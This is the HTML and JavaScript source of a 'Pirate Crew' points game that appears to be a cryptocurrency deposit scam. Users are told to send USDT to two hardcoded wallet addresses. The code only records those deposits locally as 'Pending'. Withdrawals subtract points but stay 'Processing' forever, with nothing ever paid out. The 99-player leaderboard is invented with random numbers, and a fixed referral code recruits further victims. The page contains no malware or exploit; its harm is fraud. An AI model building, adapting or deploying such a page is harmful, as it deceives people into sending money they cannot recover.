<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Game</title>
<style>
  :root{
    --paper:#f1ddb6; --paper2:#e6c98f; --ink:#2a1c10;
    --shadow:rgba(0,0,0,.25);
    --btn1:#c79a3a; --btn2:#a36f22;
    --glass:rgba(255,255,255,.35);
  }
  *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
  body{
    margin:0;
    background:#2f6f87 url("https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=1600&q=60") center/cover fixed;
    color:var(--ink);
    padding:14px;
  }
  .wrap{max-width:980px;margin:0 auto}
  .topbar{
    background:linear-gradient(180deg,var(--paper),var(--paper2));
    border:1px solid rgba(0,0,0,.15);
    border-radius:14px;
    box-shadow:0 12px 24px var(--shadow);
    padding:10px 12px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:12px;
  }
  .leftBal{display:flex;align-items:center;gap:10px}
  .coin{
    width:34px;height:34px;border-radius:50%;
    background:radial-gradient(circle at 30% 30%, #fff2cc 0%, #d7a64b 55%, #7a4a10 100%);
    border:2px solid rgba(0,0,0,.22);
    box-shadow: inset 0 2px 6px rgba(255,255,255,.35);
  }
  .balNum{font-weight:1000;font-size:22px}
  .small{font-weight:800;opacity:.85;font-size:13px}

  .rightBtns{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  .btn{
    border:none;border-radius:12px;
    padding:10px 12px;
    font-weight:1000;
    cursor:pointer;
    color:#fff;
    background:linear-gradient(180deg,var(--btn1),var(--btn2));
    box-shadow:0 10px 18px rgba(0,0,0,.25);
  }
  .btn.gray{
    color:#2a1c10;
    background:rgba(255,255,255,.45);
    border:1px solid rgba(0,0,0,.12);
    box-shadow:none;
  }

  .grid3{
    margin-top:12px;
    display:grid;
    grid-template-columns:repeat(3,1fr);
    gap:10px;
  }
  @media(max-width:900px){.grid3{grid-template-columns:1fr}}
  .stat{
    background:linear-gradient(180deg,var(--paper),var(--paper2));
    border:1px solid rgba(0,0,0,.15);
    border-radius:14px;
    padding:12px;
    box-shadow:0 10px 20px var(--shadow);
  }
  .stat .t{font-weight:1000}
  .stat .v{margin-top:6px;font-weight:1000;font-size:18px}
  .stat .sub{margin-top:2px;font-size:13px;font-weight:800;opacity:.85}

  .panel{
    margin-top:12px;
    background:linear-gradient(180deg,var(--paper),var(--paper2));
    border:1px solid rgba(0,0,0,.15);
    border-radius:14px;
    padding:12px;
    box-shadow:0 10px 20px var(--shadow);
  }
  .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
  .tab{
    padding:9px 12px;border-radius:12px;
    border:1px solid rgba(0,0,0,.15);
    background:rgba(255,255,255,.35);
    font-weight:1000;cursor:pointer;user-select:none;
  }
  .tab.active{
    background:linear-gradient(180deg,var(--btn1),var(--btn2));
    color:#fff;border-color:rgba(0,0,0,.2);
  }
  .hide{display:none!important}

  .box{
    background:var(--glass);
    border:1px solid rgba(0,0,0,.12);
    border-radius:14px;
    padding:12px;
  }
  .field{margin-top:10px}
  .field label{display:block;font-weight:1000;margin:0 0 6px}
  .field input{
    width:100%;
    padding:12px;
    border-radius:12px;
    border:1px solid rgba(0,0,0,.15);
    background:rgba(255,255,255,.6);
    font-weight:900;
    outline:none;
    color:#1d140c;
  }
  .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:10px}
  .msg{margin-top:10px;font-weight:1000;display:none}
  .good{color:#155a2c}
  .bad{color:#7b0f1f}
  .warn{color:#6a4b00}

  table{width:100%;border-collapse:collapse;margin-top:10px}
  th,td{padding:10px 8px;border-bottom:1px solid rgba(0,0,0,.15);text-align:left}
  th{font-weight:1000}
  td{font-weight:900}

  /* Toast */
  .toastWrap{
    position:fixed; right:12px; top:120px; z-index:9999;
    width:min(320px, calc(100vw - 24px));
    display:flex;flex-direction:column;gap:10px;
    pointer-events:none;
  }
  .toast{
    background:rgba(10,20,35,.88);
    border:1px solid rgba(255,255,255,.12);
    color:#eaf2ff;border-radius:16px;
    padding:12px 14px;
    box-shadow:0 16px 30px rgba(0,0,0,.40);
    backdrop-filter: blur(8px);
    transform:translateX(10px);opacity:0;
    transition:all .25s ease;
  }
  .toast.show{transform:translateX(0);opacity:1}
  .toast .t{font-weight:1000;margin-bottom:4px}
  .toast .s{font-weight:800;color:rgba(234,242,255,.85);font-size:13px;line-height:1.3}
</style>
</head>
<body>
<div class="wrap">

  <div class="topbar">
    <div class="leftBal">
      <div class="coin"></div>
      <div>
        <div class="small">Balance (Points)</div>
        <div class="balNum" id="balPoints">0</div>
      </div>
    </div>

    <div class="rightBtns">
      <button class="btn gray" id="copyRefBtn">Copy Referral</button>
      <button class="btn gray" id="logoutBtn">Logout</button>
    </div>
  </div>

  <div class="grid3">
    <div class="stat">
      <div class="t">Pirate Crew</div>
      <div class="v"><span id="crew">0</span>/1000</div>
      <div class="sub">Income/day grows with crew</div>
    </div>
    <div class="stat">
      <div class="t">Ship Capacity</div>
      <div class="v"><span id="ship">25000</span>/25000</div>
      <div class="sub">Storage limit</div>
    </div>
    <div class="stat">
      <div class="t">Treasure Map</div>
      <div class="v"><span id="map">2407</span>/25000</div>
      <div class="sub">Daily limit meter</div>
    </div>
  </div>

  <div class="panel">
    <div class="tabs">
      <div class="tab active" data-tab="topup">Top Up</div>
      <div class="tab" data-tab="withdraw">Withdraw</div>
      <div class="tab" data-tab="topusers">Top Users</div>
      <div class="tab" data-tab="history">History</div>
    </div>

    <!-- TOP UP -->
    <div id="tab-topup">
      <div class="box">
        <div style="font-weight:1000">Top Up (USDT)</div>
        <div class="small">Choose network and copy address (edit করা যাবে না)।</div>

        <div class="row">
          <div class="tab active" id="netTRC">USDT TRC20</div>
          <div class="tab" id="netBEP">USDT BEP20</div>
        </div>

        <div class="field">
          <label>Wallet Address</label>
          <input id="topupAddr" readonly value="TKkwEZEW8L6oyW7R2yxuWRHVDJ8L7RysK7">
        </div>

        <div class="row">
          <button class="btn gray" id="copyAddrBtn">Copy Address</button>
        </div>

        <hr style="border:none;border-top:1px solid rgba(0,0,0,.15);margin:12px 0">

        <div class="field">
          <label>Amount (USDT)</label>
          <input id="tuAmount" type="number" placeholder="e.g. 10">
        </div>
        <div class="field">
          <label>TxnID / Hash</label>
          <input id="tuTxn" placeholder="paste transaction id">
        </div>
        <div class="row">
          <button class="btn" id="tuSubmit">Submit</button>
        </div>
        <div id="tuMsg" class="msg"></div>

        <div class="small" style="margin-top:10px">
          Minimum Withdraw: <b>50,000 points = $10</b>
        </div>
      </div>
    </div>

    <!-- WITHDRAW -->
    <div id="tab-withdraw" class="hide">
      <div class="box">
        <div style="font-weight:1000">Withdraw</div>
        <div class="small">Minimum: <b>50,000 points = $10</b></div>

        <div class="field">
          <label>Amount (Points)</label>
          <input id="wdAmount" type="number" placeholder="min 50000">
        </div>
        <div class="field">
          <label>Wallet Address</label>
          <input id="wdAddress" placeholder="your usdt wallet address">
        </div>
        <div class="row">
          <button class="btn" id="wdBtn">Withdraw</button>
        </div>
        <div id="wdMsg" class="msg"></div>

        <div class="small" style="margin-top:10px" id="latestWd">No withdrawals yet.</div>
      </div>
    </div>

    <!-- TOP USERS -->
    <div id="tab-topusers" class="hide">
      <div class="box">
        <div style="font-weight:1000">Top Users</div>
        <table>
          <thead>
            <tr><th style="width:55px">#</th><th>Nick</th><th style="width:140px">Income/day</th><th style="width:150px">Points</th></tr>
          </thead>
          <tbody id="topUsersBody"></tbody>
        </table>
      </div>
    </div>

    <!-- HISTORY -->
    <div id="tab-history" class="hide">
      <div class="box">
        <div style="font-weight:1000">History</div>

        <div style="margin-top:10px;font-weight:1000">Top Up</div>
        <table>
          <thead><tr><th>Time</th><th>Amount</th><th>TxnID</th><th>Status</th></tr></thead>
          <tbody id="topupHist"></tbody>
        </table>

        <div style="margin-top:12px;font-weight:1000">Withdraw</div>
        <table>
          <thead><tr><th>Time</th><th>Points</th><th>USD</th><th>Status</th></tr></thead>
          <tbody id="wdHist"></tbody>
        </table>
      </div>
    </div>

  </div>
</div>

<div class="toastWrap" id="toastWrap"></div>

<script>
/* ===== AUTH ===== */
const LS_USER="saved_username";
const LS_PASS="saved_password";
const LS_LOGGED="is_logged_in";
if(localStorage.getItem(LS_LOGGED)!=="true"){
  location.href="index.html";
}
document.getElementById("logoutBtn").addEventListener("click", ()=>{
  localStorage.setItem(LS_LOGGED,"false");
  location.href="index.html";
});

/* ===== CONFIG ===== */
const FIXED_REF_CODE="WIN500";
const ADDR_TRC="TKkwEZEW8L6oyW7R2yxuWRHVDJ8L7RysK7";
const ADDR_BEP="0x8eaf83d0463438b74c4a6d7c018f0e93bab988ec";

const MIN_WITHDRAW_POINTS=50000;
const POINTS_TO_USD=10/50000; // 0.0002

/* ===== STATE ===== */
const LS_STATE="game_state";
function defaultState(){
  return { balance:0, incomeDay:0, crew:0, lastTick:Date.now(), topups:[], withdraws:[] };
}
function loadState(){
  const raw=localStorage.getItem(LS_STATE);
  if(!raw) return defaultState();
  try{ return { ...defaultState(), ...JSON.parse(raw) }; }
  catch{ return defaultState(); }
}
function saveState(s){ localStorage.setItem(LS_STATE, JSON.stringify(s)); }
function fmt(n){ return Number(n||0).toLocaleString(); }
function pointsToUSD(p){ return (p*POINTS_TO_USD).toFixed(2); }

/* ===== UI ===== */
const balPointsEl=document.getElementById("balPoints");
const crewEl=document.getElementById("crew");
const topupAddr=document.getElementById("topupAddr");
const tuAmount=document.getElementById("tuAmount");
const tuTxn=document.getElementById("tuTxn");
const tuMsg=document.getElementById("tuMsg");
const wdAmount=document.getElementById("wdAmount");
const wdAddress=document.getElementById("wdAddress");
const wdMsg=document.getElementById("wdMsg");
const latestWd=document.getElementById("latestWd");
const topupHist=document.getElementById("topupHist");
const wdHist=document.getElementById("wdHist");
const toastWrap=document.getElementById("toastWrap");

/* ===== Toast ===== */
function toast(title, sub){
  const t=document.createElement("div");
  t.className="toast";
  t.innerHTML=`<div class="t">${title}</div><div class="s">${sub}</div>`;
  toastWrap.appendChild(t);
  requestAnimationFrame(()=>t.classList.add("show"));
  setTimeout(()=>{ t.classList.remove("show"); setTimeout(()=>t.remove(),250); }, 2200);
}

/* ===== Tabs ===== */
document.querySelectorAll(".tab[data-tab]").forEach(btn=>{
  btn.addEventListener("click", ()=>{
    document.querySelectorAll(".tab[data-tab]").forEach(b=>b.classList.remove("active"));
    btn.classList.add("active");
    const tab=btn.dataset.tab;
    ["topup","withdraw","topusers","history"].forEach(t=>{
      document.getElementById("tab-"+t).classList.toggle("hide", t!==tab);
    });
    if(tab==="history") renderHistory();
  });
});

/* ===== Network switch (TopUp) ===== */
const netTRC=document.getElementById("netTRC");
const netBEP=document.getElementById("netBEP");
let currentNet="TRC";

function setNet(net){
  currentNet=net;
  if(net==="TRC"){
    netTRC.classList.add("active");
    netBEP.classList.remove("active");
    topupAddr.value=ADDR_TRC;
  }else{
    netBEP.classList.add("active");
    netTRC.classList.remove("active");
    topupAddr.value=ADDR_BEP;
  }
}
netTRC.addEventListener("click", ()=>setNet("TRC"));
netBEP.addEventListener("click", ()=>setNet("BEP"));
setNet("TRC");

/* ===== Copy buttons ===== */
async function copyText(text){
  try{ await navigator.clipboard.writeText(text); return true; }
  catch{ return false; }
}
document.getElementById("copyAddrBtn").addEventListener("click", async ()=>{
  const ok=await copyText(topupAddr.value);
  toast(ok?"Copied":"Copy failed", ok?"Address copied":"Copy manually");
});
document.getElementById("copyRefBtn").addEventListener("click", async ()=>{
  const base=location.origin + location.pathname.replace(/game\.html$/,"index.html");
  const link=`${base}?ref=${FIXED_REF_CODE}`;
  const ok=await copyText(link);
  toast(ok?"Copied":"Copy failed", ok?"Referral link copied":"Copy manually");
});

/* ===== Income accrual (per day) ===== */
function tickIncome(s){
  const now=Date.now();
  const last=s.lastTick||now;
  const dt=Math.max(0, now-last);
  const earned=(s.incomeDay/86400000)*dt;
  s.balance=Math.floor(s.balance + earned);
  s.lastTick=now;
}

/* ===== Submit TopUp (Pending log) ===== */
document.getElementById("tuSubmit").addEventListener("click", ()=>{
  const amt=Number(tuAmount.value||0);
  const txn=(tuTxn.value||"").trim();
  if(amt<=0){ tuMsg.style.display="block"; tuMsg.className="msg bad"; tuMsg.textContent="❌ Enter amount"; return; }
  if(!txn){ tuMsg.style.display="block"; tuMsg.className="msg bad"; tuMsg.textContent="❌ Enter TxnID"; return; }

  const s=loadState();
  s.topups.unshift({ time:new Date().toLocaleString(), amount:amt, txn, net:currentNet, status:"Pending" });
  saveState(s);

  tuMsg.style.display="block"; tuMsg.className="msg good"; tuMsg.textContent="✅ Submitted (Pending)";
  tuAmount.value=""; tuTxn.value="";
  toast("Top Up", "Submitted (Pending)");
});

/* ===== Withdraw (Processing) ===== */
document.getElementById("wdBtn").addEventListener("click", ()=>{
  const points=Number(wdAmount.value||0);
  const addr=(wdAddress.value||"").trim();

  if(points<MIN_WITHDRAW_POINTS){
    wdMsg.style.display="block"; wdMsg.className="msg bad";
    wdMsg.textContent=`❌ Minimum ${fmt(MIN_WITHDRAW_POINTS)} points ($10)`;
    return;
  }
  if(!addr){
    wdMsg.style.display="block"; wdMsg.className="msg bad";
    wdMsg.textContent="❌ Enter wallet address";
    return;
  }

  const s=loadState();
  tickIncome(s);

  if(s.balance < points){
    wdMsg.style.display="block"; wdMsg.className="msg bad";
    wdMsg.textContent="❌ Not enough balance";
    saveState(s); render(s);
    return;
  }

  s.balance -= points;
  s.withdraws.unshift({
    time:new Date().toLocaleString(),
    points,
    usd: pointsToUSD(points),
    status:"Processing"
  });
  saveState(s);

  wdMsg.style.display="block"; wdMsg.className="msg warn";
  wdMsg.textContent=`⏳ Processing… (${fmt(points)} points = $${pointsToUSD(points)})`;
  wdAmount.value="";
  render(s);
  toast("Withdraw", "Processing…");
});

/* ===== Top Users 99 ===== */
function generateTopUsers99(){
  const me=(localStorage.getItem(LS_USER)||"you").trim();
  const tbody=document.getElementById("topUsersBody");
  tbody.innerHTML="";

  const seedNames=["Denki","Dali","Andrea","Noomi","Ayoub","Rafi","Sami","Xan","Mim","Tanha","Nabil","Sakib","Raihan","Fahim","Arif","Shuvo","Nayeem","Rimon","Sohan","Kamal"];

  const users=[];
  for(let i=1;i<=99;i++){
    const base=seedNames[i-1] || `user_${String(i).padStart(3,"0")}`;
    const daysActive=Math.floor(Math.random()*30)+30; // 30-59 days
    const incomeDay=Math.floor(Math.random()*900)+900; // 900-1799
    const points=Math.floor(incomeDay*daysActive + Math.random()*120000);
    users.push({name:base,incomeDay,points});
  }
  users.sort((a,b)=>b.points-a.points);

  users.forEach((u,idx)=>{
    const tr=document.createElement("tr");
    const isMe = u.name.toLowerCase()===me.toLowerCase();
    tr.innerHTML = `
      <td>${idx+1}</td>
      <td>${u.name}${isMe?' (you)':''}</td>
      <td>${fmt(u.incomeDay)}</td>
      <td>${fmt(u.points)}</td>
    `;
    tbody.appendChild(tr);
  });
}

/* ===== Render ===== */
function renderHistory(){
  const s=loadState();

  topupHist.innerHTML="";
  (s.topups||[]).slice(0,30).forEach(t=>{
    const tr=document.createElement("tr");
    tr.innerHTML = `<td>${t.time}</td><td>${t.amount}</td><td style="word-break:break-all">${t.txn}</td><td>${t.status}</td>`;
    topupHist.appendChild(tr);
  });
  if((s.topups||[]).length===0){
    const tr=document.createElement("tr");
    tr.innerHTML = `<td colspan="4">No topups yet.</td>`;
    topupHist.appendChild(tr);
  }

  wdHist.innerHTML="";
  (s.withdraws||[]).slice(0,30).forEach(w=>{
    const tr=document.createElement("tr");
    tr.innerHTML = `<td>${w.time}</td><td>${fmt(w.points)}</td><td>$${w.usd}</td><td>${w.status}</td>`;
    wdHist.appendChild(tr);
  });
  if((s.withdraws||[]).length===0){
    const tr=document.createElement("tr");
    tr.innerHTML = `<td colspan="4">No withdrawals yet.</td>`;
    wdHist.appendChild(tr);
  }
}

function renderLatestWithdraw(s){
  if(!s.withdraws || s.withdraws.length===0){
    latestWd.textContent="No withdrawals yet.";
    return;
  }
  const w=s.withdraws[0];
  latestWd.innerHTML=`<b>${w.status}</b> • ${fmt(w.points)} points ($${w.usd}) • ${w.time}`;
}

function render(s){
  balPointsEl.textContent=fmt(s.balance);
  crewEl.textContent=fmt(s.crew);
  renderLatestWithdraw(s);
}

/* ===== Boot ===== */
(function boot(){
  const s=loadState();
  tickIncome(s);
  saveState(s);
  render(s);
  generateTopUsers99();
})();
setInterval(()=>{
  const s=loadState();
  tickIncome(s);
  saveState(s);
  render(s);
}, 5000);
</script>
</body>
</html>
